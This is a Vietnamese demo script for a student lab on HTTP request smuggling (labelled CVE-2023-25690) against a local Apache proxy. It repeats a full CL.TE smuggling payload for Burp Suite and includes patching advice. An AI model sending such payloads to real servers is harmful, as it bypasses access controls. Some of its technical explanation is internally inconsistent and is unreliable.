# 🎬 Kịch Bản Demo CVE-2023-25690 — Burp Suite + Inspector Logs

> **Thời lượng:** 15 phút | **Công cụ:** Burp Suite + Docker Inspector Logs  
> **Mục tiêu:** Demo HTTP Request Smuggling (CL.TE) để bypass Apache reverse proxy security

---

## 🎯 Tổng Quan Demo

```
Burp Suite (Craft Request)  ←→  Docker Inspector Logs (Chứng minh)
     ↓                                      ↓
  Gửi 1 request               Hiển thị 2 separate REQ/RSP
  Nhận 2 responses            Chứng minh TCP stream bị phá vỡ
  Bypass Apache 403           2 requests riêng biệt từ 1 smuggle
```

**Chứng minh chính:**
- **Burp:** 2 HTTP responses từ 1 request
- **Inspector Logs:** 2 REQ + 2 RSP từ 1 smuggle
- **Minh chứng:** Apache 2.4.58 chặn nó (chỉ 403)

---

## 📋 Chuẩn Bị (30 phút trước demo)

### **Terminal 1: Docker**
```bash
cd D:\code\BTL-AnToanMang
docker compose up --build
# Chờ: mysql_db, backend_spring, http_inspector, apache_proxy ✓

# Port mapping:
# - Port 8000:   Proxy bảo vệ (Protected) - chặn Swagger, proxy /api/ only
# - Port 9080:   Lab 1 - RewriteRule (Vulnerable) - proxy ALL paths
# - Port 9081:   Lab 2 - ProxyPassMatch (Vulnerable) - proxy ALL paths
# - Port 8080:   Backend direct access (Reference - không proxy)
```

### **Terminal 2: Inspector Logs**
```bash
docker compose logs inspector -f
# Sẽ hiển thị REQ #N và RSP #N real-time
```

### **Terminal 3: Burp Suite**
```bash
# Mở Burp Suite Community
# Proxy → Options → Proxy Listeners
# ✓ localhost:8080 Running (browser → Burp proxy)

# Firefox → Settings → Network → Manual proxy
# HTTP Proxy: 127.0.0.1:8080
# (Burp sẽ forward tới Apache hoặc Backend tùy request)
```

---

## 🎬 Kịch Bản Demo (15 phút)

### **GIAI ĐOẠN 1: Request Bình Thường (2 phút)**

**Trong Burp Suite → Repeater tab:**

#### 1.1 Test Port 8000 (Protected - chặn Swagger)
```http
GET /v3/api-docs HTTP/1.1
Host: localhost:8000
```

Click **Send**

**Response dự kiến:**
```
HTTP/1.1 403 Forbidden
Content-Length: 0
```

**Nói:** "Đây là port 8000 - được bảo vệ bởi Apache reverse proxy. Khi yêu cầu /v3/api-docs, Apache chặn ngay lập tức → 403 Forbidden. Đây là lớp bảo mật ở biên (perimeter security) mà chúng ta sẽ cố gắng bypass."

📸 **Chụp screenshot này**

---

#### 1.2 Test Port 8080 (Backend Direct - không có proxy)
```http
GET /v3/api-docs HTTP/1.1
Host: localhost:8080
```

Click **Send**

**Response dự kiến:**
```
HTTP/1.1 200 OK
Content-Type: application/json
...
{"openapi":"3.1.0","info":{"title":"OpenAPI definition",...}
```

**Nói:** "Đây là port 8080 - trực tiếp tới backend Spring Boot, không qua Apache proxy. Backend trả về 200 OK + toàn bộ Swagger data. Điều này chứng minh rằng backend thực sự có dữ liệu Swagger, nó chỉ bị Apache chặn ở layer proxy. Backend không có cơ chế bảo mật nào cho /v3/api-docs."

📸 **Chụp screenshot này**

---

### **GIAI ĐOẠN 2: Smuggle Request trên Port 9080 (3 phút)**

**Trong Burp Suite → Repeater tab:**

**Xóa request trước, paste cái này:**

```http
POST /app/anything HTTP/1.1
Host: localhost:9080
Content-Length: 85
Transfer-Encoding: chunked
Connection: keep-alive

0

GET /v3/api-docs HTTP/1.1
Host: localhost:9080
Connection: close

```

⚠️ **Quan trọng:** Phải có dòng trống ở cuối (sau `Connection: close`)

Click **Send**

**Response dự kiến:**
```
HTTP/1.1 403 Forbidden
Content-Length: 0
...

HTTP/1.1 200 OK
Content-Type: application/json
...
[{"operationId":"getAuthMyInfo",...}]
```

**Chính điểm:** 2 HTTP responses từ 1 request!

**Nói:**
```
"Chú ý cái gì xảy ra ở đây:

1. Tôi gửi 1 request duy nhất
2. Nhưng nhận lại 2 responses:
   - Response #1: 403 Forbidden (Apache chặn)
   - Response #2: 200 OK với Swagger API data (BYPASS!)

Tức là backend nhận được 2 requests thay vì 1!

Làm sao được? Vì mismatch giữa Content-Length và Transfer-Encoding:
- Apache parse theo Content-Length = 85 bytes đầu tiên
- Backend parse theo Transfer-Encoding: chunked

Khi Apache đọc 85 bytes (request #1), nó truyền đến backend.
Backend đọc Transfer-Encoding: chunked, thấy '0\\r\\n\\r\\n' = kết thúc chunk.
Sau đó, nó thấy request #2 (GET /v3/api-docs) ẩn trong đó!

Ranh giới request bị phá vỡ → HTTP Request Smuggling thành công!"
```

📸 **Chụp screenshot Burp response (hiển thị cả 403 và 200 OK)**

---

### **GIAI ĐOẠN 3: Inspector Logs Evidence (3 phút)**

**Trong Terminal 2 (docker logs), bạn sẽ thấy:**

```
[2026-10-09T06:19:00] REQ #1
POST /app/anything HTTP/1.1
Host: localhost:9080
Content-Length: 85
Transfer-Encoding: chunked
Connection: keep-alive

================================================================================

[2026-10-09T06:19:00] REQ #2
GET /v3/api-docs HTTP/1.1
Host: localhost:9080
Connection: close

================================================================================

[2026-10-09T06:19:00] RSP #1
HTTP/1.1 403 Forbidden
Content-Length: 0

================================================================================

[2026-10-09T06:19:00] RSP #2
HTTP/1.1 200 OK
Content-Type: application/json
...
{"openapi":"3.1.0",...}
```

**Nói:**
```
"Inspector logs (monitor giữa Apache ↔ Backend) cho thấy rõ ràng:

- REQ #1: POST /app/anything (Apache chặn → 403)
- REQ #2: GET /v3/api-docs (BYPASS được → 200 OK!)

1 request gửi vào từ client → 2 requests riêng biệt trong logs.

Đây là chứng minh tuyệt đối rằng:
1. Backend nhận 2 requests từ 1 yêu cầu smuggle
2. TCP stream boundary bị phá vỡ
3. HTTP Request Smuggling đã thành công!"
```

📸 **Chụp screenshot inspector logs (hiển thị cả 4 entries: 2 REQ + 2 RSP)**

---

### **GIAI ĐOẠN 4: Lab 2 - ProxyPassMatch Alternative (2 phút)**

**Chỉ để chứng tỏ cách khác cũng dễ bị tấn công:**

**Trong Burp Suite, gửi request tương tự tới port 9081:**

```http
POST /app/anything HTTP/1.1
Host: localhost:9081
Content-Length: 85
Transfer-Encoding: chunked
Connection: keep-alive

0

GET /v3/api-docs HTTP/1.1
Host: localhost:9081
Connection: close

```

Click **Send**

**Response dự kiến:** Giống như port 9080 - cũng nhận 403 + 200 OK

**Nói:** "Port 9081 sử dụng ProxyPassMatch thay vì RewriteRule, nhưng kết quả vẫn như nhau - cả hai cách proxy đều bị tấn công bởi CL.TE mismatch."

---

### **GIAI ĐOẠN 5: Proof - Apache 2.4.58 (3 phút)**

**Dừng Docker:**
```bash
# Terminal 1
docker compose down
```

**Khởi động lại với Apache 2.4.58 (đã vá):**
```bash
APACHE_VERSION=2.4.58 docker compose up --build
# Chờ healthy
```

**Khởi động logs lại:**
```bash
# Terminal 2
docker compose logs inspector -f
```

**Trong Burp Suite, gửi request smuggle giống hệt lên port 9080:**

```http
POST /app/anything HTTP/1.1
Host: localhost:9080
Content-Length: 85
Transfer-Encoding: chunked
Connection: keep-alive

0

GET /v3/api-docs HTTP/1.1
Host: localhost:9080
Connection: close

```

Click **Send**

**Response dự kiến:**
```
HTTP/1.1 403 Forbidden
Content-Length: 0
```

⚠️ **Không có 200 OK! Không có Swagger data!**

**Trong Inspector logs:**
```
Chỉ có REQ #1 và RSP #1
Không có REQ #2, không có RSP #2
→ Apache 2.4.58 đã chặn smuggle!
```

**Nói:**
```
"Điểm mấu chốt: Chỉ thay đổi một điều - Apache version từ 2.4.55 → 2.4.58

Mọi thứ khác vẫn như cũ:
- Burp request: giống hệt (smuggle payload)
- Backend code: không thay đổi
- Database: không thay đổi

Kết quả?
- Apache 2.4.55: 200 OK (Bypass thành công!)
- Apache 2.4.58: 403 (Bypass bị chặn)

Điều này chứng minh: Lỗi là của Apache, KHÔNG phải backend!

Apache 2.4.56+ đã fix CVE-2023-25690 bằng cách:
1. Phát hiện mismatch giữa Content-Length và Transfer-Encoding
2. Reject những requests ambiguous
3. Enforce consistent parsing rules

Bài học: Không phó thác bảo mật cho proxy - backend phải tự bảo vệ!"
```

📸 **Chụp screenshot Burp response (chỉ 403, không có 200)**  
📸 **Chụp screenshot inspector logs (chỉ REQ #1, RSP #1)**

---

## 💡 Bài Học & Talking Points

### **HTTP Request Smuggling là gì?**
```
Kỹ thuật exploit lỗi parsing HTTP ở proxy và backend.

Khi proxy và backend parse HTTP request khác nhau:
→ Proxy thấy 1 request
→ Backend thấy 2 requests

Dùng để bypass bảo mật ở proxy layer.
```

### **Tại sao CL.TE lại hoạt động?**
```
Content-Length = "Số byte chính xác trong body"
Transfer-Encoding: chunked = "Body gửi theo chunks (kích thước + dữ liệu)"

Khi cả hai xuất hiện:
- Apache parse Content-Length → chỉ đọc 85 bytes đầu
- Backend parse Transfer-Encoding: chunked → đọc chunk (0 = kết thúc) + request tiếp theo

Mismatch! Ranh giới request không rõ ràng → 2 requests độc lập được tạo!
```

### **Tại sao nguy hiểm?**
```
1. Bypass chính sách bảo mật ở proxy (như demo này)
2. Cache poisoning (nếu có reverse cache)
3. Session hijacking (nếu session logic coi request thứ 2 từ attacker)
4. Response smuggling (nếu output không validate)
5. Credential theft (smuggle request đi lệnh authentication)

Trong demo này: 
→ Bypass Apache chặn Swagger
→ Access API docs mà chỉ có backend mới biết
```

### **Cách Phòng Thủ?**
```
1. Patch (Chính yếu): Nâng cấp Apache ≥ 2.4.56
   
2. Proxy layer:
   - Kiểm tra CL/TE conflict, reject ambiguous requests
   - Normalize headers trước khi forward
   - Không cho phép request có cả Content-Length và TE
   
3. Backend defense (thứ 2):
   - Thêm authentication/authorization cho sensitive endpoints
   - Không phó thác bảo mật cho proxy
   
4. Monitoring:
   - Log tất cả requests
   - Detect pattern anomalies
   
BÀI HỌC: Defense in Depth - phòng thủ nhiều lớp!
```

---

## ⚙️ Burp Suite Tips

### **Tạo Request trong Repeater**
1. Mở **Repeater** tab
2. Copy-paste request từ trên
3. Click **Send**
4. Response hiện ở panel bên phải

### **So sánh Requests**
- **Request 1** (protected) vs **Request 2** (vulnerable)
- Hiển thị sự khác biệt: một bị chặn, một bypass

### **Nếu Request không có Response**
- Kiểm tra: Apache đang chạy? `docker ps`
- Kiểm tra: Proxy listener trên 8080? (Burp Proxy → Options)
- Thử: Disable browser cache, clear cookies
- Kiểm tra: Đã switch sang port 9080/9081 chưa?

---

## 📸 Screenshots Cần Chụp

| # | Nguồn | Nội dung | Lý do |
|---|--------|---------|------|
| 1 | Burp | Port 8000 → 403 | Baseline (bảo vệ hoạt động) |
| 2 | Burp | Port 8080 → 200 OK | Backend có data (reference) |
| 3 | Burp | Port 9080 → **403 + 200 OK** | **CHỨNG MINH: 2 responses** |
| 4 | Inspector | REQ #1, REQ #2, RSP #1, RSP #2 | **MINH CHỨNG: 2 requests** |
| 5 | Burp | Port 9080 Apache 2.4.58 → **Only 403** | **Xác nhận: Apache đã fix** |

---

## ✅ Checklist Chuẩn Bị Demo

- [ ] `docker compose up --build` thành công, tất cả containers healthy
- [ ] Terminal 2: `docker compose logs inspector -f` chạy
- [ ] Burp Suite mở, proxy listener trên 8080
- [ ] Firefox/Chrome proxy configured (127.0.0.1:8080)
- [ ] Test bình thường: Port 8000 `/v3/api-docs` → 403 ✓
- [ ] Test backend: Port 8080 `/v3/api-docs` → 200 OK ✓
- [ ] Test smuggle: Port 9080 → 403 + 200 OK ✓
- [ ] Inspector logs hiển thị 2 REQ/2 RSP ✓
- [ ] Alt test: Port 9081 ProxyPassMatch → cũng bị bypass ✓
- [ ] Apache 2.4.58 version tested (chỉ 403) ✓
- [ ] Cả 5 screenshots đã chụp
- [ ] Slides presentation sẵn sàng
- [ ] Kiểm tra projector/screen share

---

## 🚨 Troubleshooting

| Vấn đề | Giải pháp |
|--------|----------|
| Burp response trống | Kiểm tra proxy listener: Burp → Proxy → Options |
| Chỉ 403, không 200 OK | Kiểm tra Apache version (phải 2.4.55?), xem inspector logs |
| Inspector logs không hiển thị | `docker compose ps` (healthy?), `docker compose logs apache` |
| Backend offline | `docker compose logs backend_spring`, restart |
| Request malformed | Đảm bảo dòng trống ở cuối, Content-Length = 85 |
| Không kết nối localhost:9080 | `curl localhost:9080` test, check firewall |
| 2 ports (8080 backend + 9080 Apache) xung đột | Dùng port 9080 cho Apache lab, 8080 cho backend direct |

**Fallback:** Nếu live demo fail, dùng pre-captured screenshots

---

## 🎤 Kịch Bản Thuyết Trình

```
[MỞ ĐẦU - 1 phút]
"Hôm nay chúng ta demo CVE-2023-25690 - lỗ hổng HTTP Request Smuggling 
trong Apache 2.4.55.

Tôi có hệ thống gồm:
- Apache 2.4.55 làm reverse proxy (port 8000)
- Spring Boot backend (port 8080)
- Apache được cấu hình chặn Swagger (/v3/api-docs)

Bây giờ, tôi sẽ dùng Burp Suite để craft 1 request đặc biệt,
sẽ bypass Apache chặn này. Inspector logs sẽ cho chứng minh rõ ràng."

[DEMO 1 - 2 phút]
"Đầu tiên: request bình thường tới /v3/api-docs trên port 8000.
Apache chặn → 403 Forbidden.
Lớp bảo mật ở biên hoạt động bình thường.

Tiếp theo: test trực tiếp backend trên port 8080.
Không qua Apache, backend trả về 200 OK + toàn bộ Swagger data.
Điều này chứng minh dữ liệu Swagger thực sự tồn tại ở backend."

[DEMO 2 - 3 phút]
"Bây giờ: request smuggle. Chú ý các chi tiết:
- Content-Length: 85 (Apache sẽ parse theo cái này)
- Transfer-Encoding: chunked (Backend sẽ parse theo cái này)
- Body chứa 2 requests khác nhau

Gửi đi...

ĐẤY! 2 responses từ 1 request:
- Response #1: 403 Forbidden (Apache chặn request #1)
- Response #2: 200 OK + Swagger data (BYPASS! Backend trả request #2)

Tức là backend nhận được 2 requests từ 1 yêu cầu smuggle.
Apache không thấy request #2 vì nó nằm trong body của request #1.

Ranh giới request đã bị phá vỡ!"

[DEMO 3 - 3 phút]
"Inspector logs (monitor giữa Apache → Backend) chứng minh điều này:
- REQ #1: POST /app/anything
- REQ #2: GET /v3/api-docs ← Request #2 từ đâu ra?!
- RSP #1: 403
- RSP #2: 200 OK

2 requests riêng biệt được detect bởi backend.
TCP stream boundary bị phá vỡ = HTTP Request Smuggling thành công!"

[DEMO 4 - 3 phút]
"Cuối cùng: thí nghiệm đối chứng.
Tôi nâng cấp Apache từ 2.4.55 → 2.4.58 (bản đã vá).

Gửi lại request smuggle giống hệt...

Chỉ có 403 Forbidden. Không có 200 OK. Không có Swagger data.
Inspector logs: chỉ có REQ #1, RSP #1. Không có REQ #2, RSP #2.

Điều này chứng minh: Apache 2.4.58 đã fix lỗi này!

Bài học quan trọng nhất:
1. Phòng thủ nhiều lớp (Defense in Depth)
2. Không phó thác bảo mật cho proxy - backend tự bảo vệ
3. Nâng cấp software kịp thời
4. Monitor traffic để detect anomalies
5. Hiểu rõ HTTP spec để identify edge cases"
```

---

**Sẵn sàng demo! Chúc bạn thuyết trình thành công! 🚀**
